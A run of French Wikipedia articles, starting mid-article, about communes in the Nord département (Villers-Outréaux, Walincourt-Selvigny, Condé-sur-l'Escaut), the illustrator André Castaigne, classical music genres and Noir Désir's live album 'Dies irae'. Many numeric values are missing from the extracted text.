Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Voies de communication et transports.
La commune est située à l'intersection des routes départementales D16, D76, D76A et D96. La D644 (dans le département du Nord) ou D1044 (dans le département de l'Aisne) qui relie Saint-Quentin à Cambrai est à environ à l'ouest.
Jusqu'en 1955, Villers-Outréaux était desservie par le réseau ferré du C.F.C., Chemins de Fer du Cambrésis de Caudry à Saint-Quentin.
Villers-Outréaux est desservie par deux lignes d'autocar du réseau CambrésiX, groupement composé de six entreprises de transport locales, vers Cambrai et Caudry.
Urbanisme.
Typologie.
Au , Villers-Outréaux est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Villers-Outréaux, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Cambrai, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (79,7 % en 2018), en diminution par rapport à 1990 (80,7 %). La répartition détaillée en 2018 est la suivante : 
terres arables (79,7 %), zones urbanisées (20,3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Logement.
En 2009, le nombre total de logements dans la commune était de 945, alors qu'il était de 917 en 1999.
Parmi ces logements, 89,8 % étaient des résidences principales, 0,9 % des résidences secondaires et 9,3 % des logements vacants. Ces logements étaient pour 98,2 % d'entre eux des maisons individuelles et pour 1,7 % des appartements.
La proportion des résidences principales, propriétés de leurs occupants était de 73,7 %, stable par rapport à 1999 (73,2 %). La part de logements HLM loués vides (logements sociaux) était de 6,3 % contre 4,8 % en 1999.
Toponymie.
Le nom "Villers" vient du latin "villa", qui désigne une habitation ou exploitation rurale. Villers[-Guislain] et Villers[-Outréaux] dépendaient au Moyen Âge de l'abbaye d'Honnecourt. Pour les distinguer on leur ajouta les noms de "Guilain" et de "Regnard", ce dernier devenant plus tard, en raison de sa situation de l'autre côté de l'Escaut par rapport à Honnecourt, « outre eau ».
Histoire.
Le village était une dépendance de l'abbaye Saint-Pierre de Honnecourt.
Comme souvent dans la région à l'époque, les routes sont longtemps restées en très mauvais état, faute d'entretien et de moyens financiers pour le faire. Dans le passé, on privilégie souvent la voie d'eau pour se déplacer lorsque c'est possible. En septembre 1790, au moment de la Révolution française, les officiers municipaux du village se plaignent que la rue du village soit inaccessible aux voitures, voire aux gens à pied, ce qui cause un grand préjudice à l'agriculture car les engrais restent souvent dans les cours.
La broderie mécanique à Villers-Outréaux.
Comme dans de nombreux villages du Cambrésis, il existait à Villers-Outréaux avant la révolution industrielle une tradition de tissage à domicile. Au début de la Révolution française, environ 400 métiers à tisser produisaient des gazes et des batistes. C'est sur cette tradition industrielle que s'installa l'industrie de la broderie mécanique. Les abbayes voisines de Vaucelles et de Honnecourt avaient encouragé cette vocation textile.
La broderie mécanique apparaît vers la fin du avec les métiers à bras, qui permettent de reproduire fidèlement le mouvement de la brodeuse à la main. Les premiers métiers mécaniques à broder en provenance de Saint-Gall sont installés à Saint-Quentin en 1868, et essaiment vers Beaurevoir, puis à Villers-Outréaux, où Jean-Baptiste Richez installe en 1878 le premier métier à bras, et Caudry.
Ces métiers à bras sont remplacés par des métiers automatiques de type Jacquard dans les premières années du . Les premiers sont installés à Caudry en 1906 et à Villers-Outréaux en 1910.
Actuellement la commune possède à elle seule 50 % du total des métiers de broderie mécanique en France, et en comptant les communes voisines, 76 %.
Politique et administration.
Administration municipale.
La population de la commune étant comprise entre et , le conseil municipal compte .
Liste des maires.
Maire de 1802 à 1807 : J. B. Herbet.
Tendances politiques et résultats.
Au premier tour de l'élection présidentielle de 2012, les quatre candidats arrivés en tête à Villers-Outréaux sont Nicolas Sarkozy (UMP, 33,66 %), Marine Le Pen (FN, 30,74 %), François Hollande (PS, 14,40 %) et Jean-Luc Mélenchon (Front de gauche, 8,17 %) avec un taux de participation de 78,67 %.
Au deuxième tour des élections législatives de 2012, 78,15 % des électeurs de Villers-Outréaux ont voté pour François-Xavier Villain (divers droite) (57,63 % dans la du Nord), 21,85 % pour Martine Filleul (PS) (42,37 % dans la circonscription), avec un taux de participation de 52,21 % à Villers-Outréaux et de 55,61 % dans la circonscription.
Au deuxième tour des élections régionales de 2010, 26,34 % des suffrages exprimés sont allés à la liste conduite par Daniel Percheron (PS), 42,90 % à celle de Valérie Létard (UMP), et 30,76 % à la liste FN de Marine Le Pen, pour un taux de participation de 47,75 %.
Aux élections européennes de 2009, les deux meilleurs scores à Villers-Outréaux étaient ceux de la liste de la majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 45,79 % des suffrages exprimés (département du Nord 24,57 %), et de la liste du Front national conduite par Marine Le Pen, qui a obtenu soit 13,83 % des suffrages exprimés (département du Nord 9,66 %), pour un taux de participation de 35,43 %.
Instances judiciaires et administratives.
La commune de Vendegies-sur-Écaillon est dans le ressort de la cour d'appel de Douai, du tribunal de grande instance, du tribunal d'instance et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Politique environnementale.
La protection et la mise en valeur de l'environnement font partie des compétences de la communauté de communes du Caudrésis - Catésis. Ses « brigades vertes » interviennent sur le territoire de l'ensemble des communes pour la création et l'entretien des espaces verts, l'aménagement de l'espace rural, les plantations et l'abattage d'arbres.
Jumelages.
En novembre 2015, Villers-Outréaux n'est jumelée avec aucune autre commune.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 35,7 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 27,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,31 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Villers-Outréaux est située dans l'académie de Lille et de la circonscription de Cambrai sud. La commune gère trois écoles : l'école Pasteur pour les classes maternelles, l'école Jean-Moulin pour les CP, CE1 et CE2, et l'école Victor-Hugo pour les CM1, CM2, et la classe CLIS. Les élèves de la commune relèvent du collège François-Villon de Walincourt-Selvigny.
Le collège Saint-Joseph est un établissement privé.
Santé.
Parmi les professions de santé à Villers-Outréaux on compte deux médecins généralistes, un pédicure-podologue, un kinésithérapeute et trois infirmières. La commune dispose également d'une pharmacie.
Les hôpitaux les plus proches sont à Cambrai et Saint-Quentin.
Sports.
La commune dispose d'un complexe multisports comprenant un terrain de football, un plateau multisports, une salle de sports.
L'équipe de football l'ES Villers-Outréaux réalise l'exploit pour une équipe de district d'atteindre le de la coupe de France 2012, et devra affronter pour ce même tour, Créteil jouant en national ( française). Cet exploit fut réalisable car le « petit poucet » de la coupe élimina une équipe de division d'honneur () au tour précédent.
Cultes.
Les Villersois disposent d'un lieu de culte catholique, l'église Saint Martin. Cette église dépend de la paroisse « Sainte Anne en Cambrésis » rattachée à l'archidiocèse de Cambrai.
Économie.
Revenus de la population et fiscalité.
En 2010, le revenu fiscal médian par ménage était de , ce qui plaçait Villers-Outréaux au rang parmi les de plus de en métropole.
Emploi.
Villers-Outréaux se trouve dans le bassin d'emploi du Cambrésis. L'agence Pôle emploi pour la recherche d'emploi la plus proche est localisée à Caudry.
En 2009, la population âgée de 15 à 64 ans s'élevait à , parmi lesquelles on comptait 67,8 % d'actifs dont 55,7 % ayant un emploi et 12,1 % de chômeurs.
On comptait dans la zone d'emploi, contre en 1999. Le nombre d'actifs ayant un emploi résidant dans la zone d'emploi étant de 769, l'indicateur de concentration d'emploi est de 96,5 %, ce qui signifie que la zone d'emploi offre un peu moins d'un emploi par habitant actif.
Entreprises et commerces.
Au 31 décembre 2010, Villers-Outréaux comptait : 17 dans l'agriculture-sylviculture-pêche, 64 dans l'industrie, 9 dans la construction, 86 dans le commerce-transports-services divers et 25 étaient relatifs au secteur administratif.
En 2011, ont été créées à Villers-Outréaux, dont 4 par des autoentrepreneurs.
Les entreprises principales de Villers-Outréaux sont des ateliers de broderies ainsi qu'un Intermarché.
Galerie.
Activités associatives, culturelles, festives et sportives.
La ville est représentée par la géante Pénélope, représentante de la broderie, activité principale de la commune. Sous la responsabilité de l'association « Les Amis de Pénélope », elle accompagne d'autres géants lors des fêtes ou manifestations festives dans d'autres villes de la région. Elle se distingue surtout par sa belle ombrelle brodée. Pénélope est visible à la maison de la broderie de la commune.
Personnalités liées à la commune.
Sulpice Dewez (1904-1974), homme politique et syndicaliste français né dans la commune.

</doc>
<doc id="191911" url="https://fr.wikipedia.org/wiki?curid=191911" title="André Castaigne">
André Castaigne

André Castaigne ( à Angoulême - à Paris) est un illustrateur et peintre français.
Biographie.
Il est connu pour ses illustrations de livres ("Le Fantôme de l'Opéra" de Gaston Leroux, les œuvres complètes illustrées d'Edmond Rostand) ainsi que pour ses illustrations du règne d'Alexandre le Grand.
Élève des peintres Gerôme et Alexandre Cabanel, il a vécu 20 ans à San Francisco. En 1889, il obtient une mention honorable au Salon des artistes français et est alors placé en hors-concours.

</doc>
<doc id="191912" url="https://fr.wikipedia.org/wiki?curid=191912" title="Walincourt-Selvigny">
Walincourt-Selvigny

Walincourt-Selvigny est une commune française située entre Cambrai et Guise dans le département du Nord, en région Hauts-de-France.
Ses habitants sont appelés les "Walincourtois".
Géographie.
Localisation.
La commune se trouve à de Lille et à de Cambrai à vol d'oiseau.
Géologie, relief et hydrographie.
Walincourt-Selvigny est située dans le bassin de l'Escaut.
Le ruisseau de Saugrenon longe le finage ouest de la commune. Il rejoint la Warnelle, elle-même affluent de rive droite de l'Escaut, à Esnes. De même le Ruisseau d'Iris longe une partie de la limite est du finage, et rejoint également la Warnelle.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau de Sargrenon et le ruisseau d'Iris.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Voies de communication et transports.
La commune est traversée par la route départementale 960, de Cambrai à Bohain-en-Vermandois, ainsi que par la route départementale 16.
Walincourt-Selvigny est reliée à Cambrai par la ligne 307 du réseau de transport routier Arc-en-ciel 3 et à Caudry par la ligne 327.
Urbanisme.
Typologie.
Au , Walincourt-Selvigny est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Walincourt-Selvigny, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Cambrai, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (76 % en 2018), en diminution par rapport à 1990 (77,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (68,9 %), forêts (14,3 %), zones urbanisées (9,7 %), prairies (3,9 %), zones agricoles hétérogènes (3,2 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Les opinions divergent sur l'origine du nom "Walincourt". On le trouve, entre les , sous les formes "Wallincorte" ou "Wallincurte", "Walinkurt", "Waleincurtis", "Waulaincourt" ou "Waulaincorth", "Wuilaincourt", "Walincourt", "Wallencourt" ou encore "Wallaincourt".
Selon Mannier il faut l'interpréter comme « Wallonis Curtis », le domaine ou la ferme de Wallo ou du Wallon, c'est-à-dire du nom d'un personnage ou d'un peuple. Boniface y voit le sens de bois ou forêt (du bas latin "Walda", ou du saxon "Wald") ou un retranchement (du bas latin "Walla", du latin "Vallis") ou encore une eau dormante (de "Walla"). Selon cet auteur Walincourt serait donc la « métairie du bois » ou « de la vallée ».
La divergence persiste pour "Selvigny" (mentionné du sous les noms "Silviniaco", "Silviniacum", "Selvigny", "Selvinio", "Selvingny" ou "Sevegny") : tandis que Boniface y voit « l'habitation des bois » (du latin "Sylva"), Mannier en fait « le domaine de Sylvain », "Villa Silvini".
On voit Walincourt et Selvigny entourés de bois sur la carte de Cassini.
Histoire.
Ce n'est que récemment que l'on parle de « Walincourt-Selvigny ». En effet, les deux communes (Walincourt et Selvigny) se sont unies le 8 octobre 1972. Ainsi cette date mémorable a donné le nom à la rue unissant les deux localités.
Symboliquement, le collège a été construit à mi-chemin entre les deux communes. C'est en 2002 que la rue parallèle à celle du (celle du collège) sera rebaptisée « rue Martin Luther King » en hommage au célèbre militant noir américain et à l'initiative de M. J-P. Gavériaux, personnalité locale. J-P. Gavériaux, ancien principal du collège Villon, organisa un vote des collégiens afin de choisir le nom de la rue (en 2000). Les noms de Jean Moulin ou Pierre et Marie Curie ont donc été devancés par Martin Luther King, ce qui a été vécu comme un formidable élan citoyen et de tolérance dont la presse locale s'est largement fait l'écho.
Il serait intéressant de parler et de retrouver les archives, permettant de retrouver les nombreux ouvriers et entreprises de bijouterie qui ont fait la réputation de Walincourt jusque dans les années 1970-80.
Cinq des six éoliennes du parc éolien du Bois de Saint-Aubert sont mises en service en 2024 sur le finage de Walincourt-Selvigny.
Jumelages.
La commune, au même titre que les autres communes du secteur scolaire du collège François Villon, est jumelée avec une ville allemande : Selm, distante de 430 km. Grâce à l'ancien principal du collège Jean-Pierre LEFEBVRE, artisan-initiateur du jumelage, elle entretient des liens étroits avec cette dernière. Ainsi, sous l'impulsion du comité de jumelage, de nombreux échanges culturels ont lieu avec les associations et les établissements de Selm et le collège François Villon de Walincourt-Selvigny.
Politique et administration.
Rattachements administratifs et électoraux.
Circonscriptions de rattachement.
Walincourt-Selvigny appartient à l'arrondissement de Cambrai et au canton du Cateau-Cambrésis depuis sa création.
Pour l'élection des députés, la commune fait partie de la dix-huitième circonscription du Nord, représentée depuis par Guy Bricout (UDI-LIOT).
Intercommunalité.
Depuis le , date de sa création, la commune est membre de la communauté d'agglomération du Caudrésis - Catésis, un EPCI qui comprend 46 communes et habitants en 2019. Auparavant, Walincourt-Selvigny était membre de la communauté de communes du Caudrésis, une intercommunalité qui a été dissoute le .
Institutions judiciaires.
Sur le plan des institutions judiciaires, la commune relève du tribunal judiciaire (qui a remplacé le tribunal d'instance et le tribunal de grande instance le janvier 2020), du tribunal pour enfants et du conseil de prud'hommes de Cambrai, du tribunal de commerce, de la cour d'appel et de la cour administrative d'appel de Douai et du tribunal administratif de Lille.
Administration municipale.
Le nombre d'habitants au dernier recensement étant compris entre et , le nombre de membres du conseil municipal est de 19.
Liste des maires.
Depuis mai 2020, le maire est Jérôme Méli. Il a succédé à Daniel Fiévet, premier édile de 2008 à 2020.
 
Politique environnementale.
La collecte, le traitement des déchets des ménages et des déchets assimilés font partie des compétences obligatoires de la communauté de communes du Caudrésis-Catésis à laquelle appartient Walincourt-Selvigny. La protection et la mise en valeur de l'environnement font partie de ses compétences optionnelles.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 37,6 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,12 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Le département du Nord gère le collège François-Villon.

</doc>
<doc id="191914" url="https://fr.wikipedia.org/wiki?curid=191914" title="Liste des genres musicaux classiques">
Liste des genres musicaux classiques

Cette présente la liste des genres musicaux classées par époque (sachant qu'un genre peut être utilisé à différentes époques, on n'indique que la première époque d'utilisation), par grande catégorie puis par ordre alphabétique.
Genres classés par grandes catégories.
Musique profane instrumentale.
Ces genres sont exécutés soit par un instrument soliste ou une petite formation (exemple : trio, quatuor, quintette) , soit par un orchestre plus ou moins important (orchestre symphonique, par exemple).
Les genres marqués « danse » peuvent être interprétés de façon indépendante ou dans le cadre d'une « suite », genre composé.
Dans la tradition italienne, certaines pièces peuvent être désignées simplement par leur "tempo" (andante, allegro, presto)

</doc>
<doc id="191916" url="https://fr.wikipedia.org/wiki?curid=191916" title="Condé-sur-l'Escaut">
Condé-sur-l'Escaut

Condé-sur-l'Escaut est une commune française située dans le département du Nord, en région Hauts-de-France.
Localisée sur le cours canalisé de l'Escaut, elle fait partie de la banlieue de Valenciennes et de la communauté d'agglomération Valenciennes Métropole, qui regroupe communes et , en .
Géographie.
Localisation.
Condé-sur-l'Escaut est située à au nord-est de Valenciennes, à de Lille, à de Bruxelles et à de Paris.
Le territoire communal est longé, au Nord, par la frontière belge. La ville se trouve au confluent de la Haine et de l'Escaut.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le canal de Mons de la Frontière Belge au confluent de l'Escaut canalisé, le Contre-fossé rive droite du canal de Mons, le Courant de Bernissart, le Jard, le Courant de Macou, le Courant des Vaucelles, le Malolin, la Ferme Saint-Calixte, le Coq et divers autres petits cours d'eau.
Le canal Mons-Condé a été construit à partir de 1807 et mis en service en 1818, pour faciliter le transport du « charbon de terre » par l'Escaut, des mines du Borinage vers la France (le territoire belge faisait partie de l'Empire à l'époque napoléonienne). Il a été comblé au profit du Canal Nimy-Blaton-Péronnes.
Le Jard, est un cours d'eau évacuant le trop-plein de l'étang de Chabaud-Latour, parallèle à l'Escaut canalisé à partir de Condé-sur-l'Escaut et s'y jetant (r.d.) à la limite entre Flines-lès-Mortagne et Château-l'Abbaye.
Trois plans d'eau complètent le réseau hydrographique : l'étang Chabaud-Latour, d'une superficie totale de ( sur la commune), l'étang de la Digue Noire () et Sarels ().
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Condé-sur-l'Escaut est catégorisée centre urbain intermédiaire, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (37,9 % en 2018), en diminution par rapport à 1990 (39 %). La répartition détaillée en 2018 est la suivante : 
forêts (32 %), zones urbanisées (22,4 %), prairies (12,7 %), zones agricoles hétérogènes (7,6 %), eaux continentales (7,6 %), zones humides intérieures (6 %), milieux à végétation arbustive et/ou herbacée (5,9 %), espaces verts artificialisés, non agricoles (5,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Projets d'aménagement.
Classé quartier prioritaire, le centre historique fait partie du programme national de revitalisation des quartiers anciens dégradés (PNRQAD) alors qu'il compte près de habitants pour un taux de pauvreté de 42 % en 2020.
Voie de communication et transports.
Condé-sur-l'Escaut est desservie par la ligne T2 du tramway de Valenciennes par le biais des stations "Condé – Hôtel de Ville", "Tourniquet", "Hameau de Macou" et "Lycée du Pays de Condé".
Les lignes 14, 100, 109, 133 et Illigo 2 du réseau de bus Transvilles desservent la commune. Enfin, la ligne 8 du réseau belge TEC Hainaut dessert également la commune au niveau du hameau transfrontalier de Bon-Secours.
Toponymie.
Le nom Condé vient du celtique "Condat(e)", qui signifie « confluent » (ici celui de la Haine, aujourd'hui détournée, et de l'Escaut). Le nom est romanisé en "Condatum" à l'époque gallo-romaine avant de devenir "Conde" au .
Durant la période révolutionnaire, à la demande des autorités et par décret du 25 vendémiaire an II (16 octobre 1793), comme beaucoup de communes de France dont le nom tient alors d'une connotation féodale ou religieuse, la commune, alors nommée "Condé", prend le nom de "Nord-Libre" et jusqu'au décret du .
La commune prend son nom actuel de « Condé-sur-l'Escaut », en 1886.
La commune se nomme "Konde a/d Schelde" en flamand.
Ses habitants sont appelés les "Condéens".
Histoire.
Situé en Gaule belgique à l'époque celtique, le site est occupé par les Nerviens puis par les Romains qui y installent un campement militaire.
Les Francs s'y installent ensuite à l'époque des Invasions et la région est évangélisée au par saint Wasnon, patron de l'église paroissiale. Une collégiale s'érige à proximité immédiate (actuellement place Verte) et se trouve placé sous le vocable de Notre-Dame. La fondation de ce chapitre, qui fournit au pouvoir féodal son personnel administratif, remonte à la période mérovingienne (, ainsi que l'attestent les fouilles archéologiques). Deux siècles plus tard, des Vikings, apparus une première fois en 855, s'y établissent provisoirement dans les années 880. Remontant l'Escaut sous le commandement de leurs chefs Sigfred et Godfred, ils prennent la place forte et y établissent un camp retranché avec un embryon de fortifications ; chassés en 885, ils réapparaissent dès l'année suivante jusqu'à leur expulsion définitive en 889.
La ville, très disputée, est tour à tour prise par les troupes flamandes de Jacques van Artevelde, par le roi de France Louis XI en 1477.
Jean de La Hamaïde, seigneur de Condé, meurt à la bataille d'Azincourt en 1415.
En 1654, les Espagnols commencent une période de chantiers de modernisation, interrompue par une prise française en 1655, suivie d'une reprise espagnole l'année suivante. Les Espagnols ajoutent un chemin couvert et construisent des défenses avancées. Ils renforcent les défenses du front nord-ouest par quatre puissants bastions. En 1676, Louis XIV assiège la ville, définitivement rattachée à la France par le traité de Nimègue en 1678.
Le , sont érigées en duché les terres de Condé, Fresnes, Vieux-Condé, Hargnies, situées en Hainaut, sous la dénomination de duché de Croÿ en faveur d'Emmanuel Ferdinand François duc de Croÿ (maison de Croÿ). Le bénéficiaire, prince de Solre et de Meurs, prince du Saint-Empire, grand d'Espagne de classe, maréchal des camps et armées du roi, chevalier des ordres du roi, baron et gouverneur de Condé, avait demandé de transporter le titre de duché de Croÿ, créé en 1598 par Henri IV en faveur de Charles de Croÿ sur la terre de Croÿ (Crouy-Saint-Pierre) en Picardie, sur les terres de Condé, etc.
Les troupes autrichiennes de François de Saxe-Cobourg occupent la ville après un blocus de 92 jours (). La ville est libérée des Autrichiens le par le général Schérer. Elle tombe aux mains des coalisés lors de la chute de Napoléon (1815) : ils ne la quittent que trois années plus tard, en 1818.
En 1802-1803, au niveau des transports, deux voitures relient régulièrement Condé, alors "Nord-Libre", à Mons et Tournai.
En 1808, Condé, encore appelée Nord-Libre, est un dépôt principal de sûreté, centre de détention intermédiaire entre les dépôts de sûreté et les prisons.
En 1878, l'archiduc Frédéric d'Autriche, de la branche de Teschen, y épouse la princesse Isabelle de Croÿ au château de l'Hermitage.
En 1901, Condé-sur-l'Escaut perd son titre de place forte : l'État autorisera son démantèlement en 1923.
En juillet 1914, à la veille de la Première Guerre mondiale, un rassemblement contre la guerre est organisé à Condé-sur-l'Escaut avec des représentants des partis socialistes français, belge et allemand, parmi lesquels Karl Liebknecht.
Lors de la Seconde Guerre mondiale, la commune est occupée de 1940 à 1944 par les Allemands qui exploitent ses ouvriers et sa mine de charbon.
Le charbon est exploité à la fosse Ledoux jusqu'en 1989, date de la fermeture définitive de la mine. Le site est détruit en 1991.
Le , six braqueurs attaquent la trésorerie principale de Condé-sur-l'Escaut et repartent avec un butin de (environ ), la pension trimestrielle des mineurs (le paiement des pensions était en liquide).
Politique et administration.
Tendances politiques et résultats.
Le premier tour des élections municipales de 2020 se déroule le . Le confinement lié à la pandémie de Covid-19 retarde de trois mois la tenue du second tour, qui a lieu le . S'y affrontent le maire sortant, le fils de l'ancien maire et un ancien adjoint.
Liste des maires.
Maire de 1802 à 1807 : Antoine de St-Moulin, médecin.
Instances judiciaires et administratives.
Condé-sur-l'Escaut relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Intercommunalité.
Condé-sur-l'Escaut est membre de la Communauté d'agglomération de Valenciennes Métropole qui regroupe 35 communes.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,4 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 25,8 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 52,86 % de femmes, légèrement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Condé fait partie de l'académie de Lille.

</doc>
<doc id="191919" url="https://fr.wikipedia.org/wiki?curid=191919" title="Dies irae (album de Noir Désir)">
Dies irae (album de Noir Désir)

Dies irae ("Jour de colère") est un album "live" du groupe de rock français Noir Désir, enregistré par Alessandri Pier pendant la tournée triomphale de l'album "Tostaky" en 1993, et sorti en 1994. On peut retrouver sur les deux disques de l'album quelques-uns des plus grands morceaux du groupe ainsi que trois reprises : 
Le nom de cet album est trouvé par le guitariste du groupe Serge Teyssot-Gay qui, en fouillant un dictionnaire, est tombé sur "Dies iræ", croyant d'abord à une anagramme de "Noir Désir" puis, en y découvrant la traduction, « jour de colère », trouve que ce nom fait une bonne référence au groupe. "Dies iræ" est aussi le nom d'une séquence d'une des œuvres les plus emblématiques de Mozart : La messe de Requiem en ré mineur KV. 626.
On y trouve également une autre version de "I Want You", en morceau caché, différente de la version studio officielle sortie en face B du single "Tostaky (le continent)".
Un single avec les titres "Marlène" et "Les Écorchés" accompagne la sortie de l'album.
Titres de l'album.
Tous les titres sont signés Bertrand Cantat/NoirDésir, sauf mention contraire.
Crédits.
Interprètes.
Noir Désir
Musiciens additionnels

</doc>
